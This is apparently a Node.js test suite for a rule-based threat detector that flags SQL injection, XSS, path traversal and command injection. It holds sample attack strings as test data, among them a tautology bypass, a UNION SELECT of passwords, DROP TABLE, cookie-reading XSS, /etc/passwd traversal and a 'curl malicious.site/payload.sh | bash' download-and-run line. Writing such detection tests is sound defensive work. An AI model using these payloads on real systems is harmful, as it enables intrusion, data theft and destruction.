const { test, describe } = require('node:test');
const assert = require('node:assert');
const {
  analyzeInput,
  evaluateString,
  extractStrings,
  allRules,
} = require('../src/services/threatService');

describe('Phase 5: Deterministic Security Rule Engine Test Suite', () => {
  describe('1. Rule Architecture & Safety Guarantees', () => {
    test('should have defined modular rules across all target attack categories', () => {
      assert.ok(Array.isArray(allRules));
      assert.ok(allRules.length >= 20);

      const categories = new Set(allRules.map((r) => r.category));
      assert.ok(categories.has('SQL_INJECTION'));
      assert.ok(categories.has('XSS'));
      assert.ok(categories.has('PATH_TRAVERSAL'));
      assert.ok(categories.has('COMMAND_INJECTION'));
    });

    test('should NEVER execute attacker-controlled payloads (static pattern inspection only)', () => {
      // Malicious payloads attempting process termination or code injection in JS runtime
      const dangerousInputs = [
        'process.exit(1)',
        'eval("while(1){}")',
        'require("child_process").execSync("dir")',
        '(() => { throw new Error("Executed!"); })()',
      ];

      for (const dangerous of dangerousInputs) {
        // Must execute cleanly without crashing or throwing
        const res = analyzeInput(dangerous);
        assert.ok(typeof res === 'object');
        assert.ok(Array.isArray(res.ruleMatches));
      }
    });

    test('should return hasMatches: false for benign normal requests', () => {
      const benignInputs = [
        'Wireless Bluetooth Mouse and Keyboard Combo',
        'john.smith@university.edu',
        'Hello team, please review the security report.',
        '1234567890',
        'https://example.com/products/view?category=electronics',
      ];

      for (const text of benignInputs) {
        const res = analyzeInput(text);
        assert.strictEqual(res.hasMatches, false);
        assert.strictEqual(res.ruleSeverity, 'NONE');
        assert.strictEqual(res.ruleCategory, 'NONE');
        assert.deepStrictEqual(res.ruleMatches, []);
      }
    });
  });

  describe('2. SQL Injection Deterministic Rules', () => {
    test('should detect tautology-based boolean bypasses (SQLI_TAUTOLOGY)', () => {
      const payloads = [
        "' OR '1'='1",
        "1 OR 1=1",
        "admin' AND 'a'='a",
      ];

      for (const payload of payloads) {
        const res = analyzeInput(payload);
        assert.strictEqual(res.hasMatches, true);
        assert.ok(res.ruleMatches.includes('SQLI_TAUTOLOGY'));
        assert.ok(['HIGH', 'CRITICAL'].includes(res.ruleSeverity));
        assert.strictEqual(res.ruleCategory, 'SQL_INJECTION');
      }
    });

    test('should detect UNION query extraction with CRITICAL severity (SQLI_UNION_SELECT)', () => {
      const res = analyzeInput('1 UNION SELECT null, username, password FROM users--');
      assert.strictEqual(res.hasMatches, true);
      assert.ok(res.ruleMatches.includes('SQLI_UNION_SELECT'));
      assert.strictEqual(res.ruleSeverity, 'CRITICAL');
      assert.strictEqual(res.ruleCategory, 'SQL_INJECTION');
    });

    test('should detect destructive stacked queries (SQLI_DESTRUCTIVE_STACK)', () => {
      const res = analyzeInput('1; DROP TABLE users; --');
      assert.strictEqual(res.hasMatches, true);
      assert.ok(res.ruleMatches.includes('SQLI_DESTRUCTIVE_STACK'));
      assert.strictEqual(res.ruleSeverity, 'CRITICAL');
    });

    test('should detect database schema enumeration probes (SQLI_METADATA_PROBE)', () => {
      const res = analyzeInput("1' WHERE 1=1 AND (SELECT count(*) FROM information_schema.tables) > 0--");
      assert.strictEqual(res.hasMatches, true);
      assert.ok(res.ruleMatches.includes('SQLI_METADATA_PROBE'));
      assert.strictEqual(res.ruleSeverity, 'HIGH');
    });

    test('should detect blind time-delay execution probes (SQLI_TIME_DELAY)', () => {
      const res = analyzeInput("'; WAITFOR DELAY '0:0:5'--");
      assert.strictEqual(res.hasMatches, true);
      assert.ok(res.ruleMatches.includes('SQLI_TIME_DELAY'));
    });
  });

  describe('3. Cross-Site Scripting (XSS) Deterministic Rules', () => {
    test('should detect explicit HTML <script> tags with CRITICAL severity (XSS_SCRIPT_TAG)', () => {
      const res = analyzeInput("<script>alert('XSS')</script>");
      assert.strictEqual(res.hasMatches, true);
      assert.ok(res.ruleMatches.includes('XSS_SCRIPT_TAG'));
      assert.strictEqual(res.ruleSeverity, 'CRITICAL');
      assert.strictEqual(res.ruleCategory, 'XSS');
    });

    test('should detect inline event handlers and DOM exfiltration (XSS_EVENT_HANDLER)', () => {
      const res = analyzeInput("<img src=x onerror=alert(document.cookie)>");
      assert.strictEqual(res.hasMatches, true);
      assert.ok(res.ruleMatches.includes('XSS_EVENT_HANDLER'));
      assert.ok(res.ruleMatches.includes('XSS_DOM_EXFILTRATION'));
      assert.strictEqual(res.ruleCategory, 'XSS');
    });

    test('should detect pseudo-protocol URIs (XSS_JAVASCRIPT_URI)', () => {
      const res = analyzeInput("javascript:alert(window.location)");
      assert.strictEqual(res.hasMatches, true);
      assert.ok(res.ruleMatches.includes('XSS_JAVASCRIPT_URI'));
      assert.strictEqual(res.ruleSeverity, 'HIGH');
    });

    test('should detect dangerous HTML elements like SVG with onload', () => {
      const res = analyzeInput("<svg onload=alert(1)>");
      assert.strictEqual(res.hasMatches, true);
      assert.ok(res.ruleMatches.includes('XSS_EVENT_HANDLER'));
      assert.ok(res.ruleMatches.includes('XSS_DANGEROUS_TAG'));
    });
  });

  describe('4. Path Traversal & LFI Deterministic Rules', () => {
    test('should detect directory traversal sequences (TRAVERSAL_DOT_DOT_SLASH)', () => {
      const res = analyzeInput("../../../etc/passwd");
      assert.strictEqual(res.hasMatches, true);
      assert.ok(res.ruleMatches.includes('TRAVERSAL_DOT_DOT_SLASH'));
      assert.ok(res.ruleMatches.includes('TRAVERSAL_UNIX_SENSITIVE_FILE'));
      assert.strictEqual(res.ruleSeverity, 'CRITICAL');
      assert.strictEqual(res.ruleCategory, 'PATH_TRAVERSAL');
    });

    test('should detect URL-encoded traversal patterns (TRAVERSAL_ENCODED_SLASH)', () => {
      const res = analyzeInput("..%2f..%2fwin.ini");
      assert.strictEqual(res.hasMatches, true);
      assert.ok(res.ruleMatches.includes('TRAVERSAL_ENCODED_SLASH'));
      assert.ok(res.ruleMatches.includes('TRAVERSAL_WINDOWS_SENSITIVE_FILE'));
      assert.strictEqual(res.ruleSeverity, 'CRITICAL');
    });

    test('should detect null byte terminations (TRAVERSAL_NULL_BYTE)', () => {
      const res = analyzeInput("report.pdf%00.php");
      assert.strictEqual(res.hasMatches, true);
      assert.ok(res.ruleMatches.includes('TRAVERSAL_NULL_BYTE'));
      assert.strictEqual(res.ruleSeverity, 'HIGH');
    });
  });

  describe('5. Command & Shell Injection Deterministic Rules', () => {
    test('should detect piped command execution with CRITICAL severity', () => {
      const res = analyzeInput("| whoami");
      assert.strictEqual(res.hasMatches, true);
      assert.ok(res.ruleMatches.includes('CMDI_OPERATOR_WITH_COMMAND'));
      assert.strictEqual(res.ruleSeverity, 'CRITICAL');
      assert.strictEqual(res.ruleCategory, 'COMMAND_INJECTION');
    });

    test('should detect subshell substitution syntax ($(...) and backticks)', () => {
      const resDollar = analyzeInput("test; echo $(whoami)");
      assert.strictEqual(resDollar.hasMatches, true);
      assert.ok(resDollar.ruleMatches.includes('CMDI_SUB_SHELL_EXECUTION'));

      const resBacktick = analyzeInput("test; `id`");
      assert.strictEqual(resBacktick.hasMatches, true);
      assert.ok(resBacktick.ruleMatches.includes('CMDI_SUB_SHELL_EXECUTION'));
    });

    test('should detect Windows directory drive command injection', () => {
      const res = analyzeInput("+|+dir c:\\");
      assert.strictEqual(res.hasMatches, true);
      assert.ok(res.ruleMatches.includes('CMDI_DIRECTORY_ENUMERATION'));
      assert.ok(['HIGH', 'CRITICAL'].includes(res.ruleSeverity));
      assert.strictEqual(res.ruleCategory, 'COMMAND_INJECTION');
    });

    test('should detect download and pipe execution scripts', () => {
      const res = analyzeInput("curl http://malicious.site/payload.sh | bash");
      assert.strictEqual(res.hasMatches, true);
      assert.ok(res.ruleMatches.includes('CMDI_DOWNLOAD_AND_EXECUTE'));
      assert.strictEqual(res.ruleSeverity, 'CRITICAL');
    });
  });

  describe('6. Multi-Field Objects, URL Decoding & Compound Attacks', () => {
    test('should recursively inspect deeply nested object fields', () => {
      const complexBody = {
        meta: {
          user: 'regular_user',
          filter: {
            searchQuery: "' OR 1=1--",
          },
        },
      };

      const res = analyzeInput(complexBody);
      assert.strictEqual(res.hasMatches, true);
      assert.ok(res.ruleMatches.includes('SQLI_TAUTOLOGY'));
    });

    test('should detect obfuscated URL-encoded attack strings', () => {
      // %3Cscript%3Ealert(1)%3C%2Fscript%3E
      const encodedXss = '%3Cscript%3Ealert(1)%3C%2Fscript%3E';
      const res = analyzeInput(encodedXss);
      assert.strictEqual(res.hasMatches, true);
      assert.ok(res.ruleMatches.includes('XSS_SCRIPT_TAG'));
    });

    test('should categorize multi-vector attack payloads as MULTIPLE', () => {
      const compoundAttack = "' OR 1=1; | cat /etc/passwd; <script>alert(1)</script>";
      const res = analyzeInput(compoundAttack);
      assert.strictEqual(res.hasMatches, true);
      assert.strictEqual(res.ruleCategory, 'MULTIPLE');
      assert.strictEqual(res.ruleSeverity, 'CRITICAL');
      assert.ok(res.categories.includes('SQL_INJECTION'));
      assert.ok(res.categories.includes('COMMAND_INJECTION'));
      assert.ok(res.categories.includes('XSS'));
    });
  });
});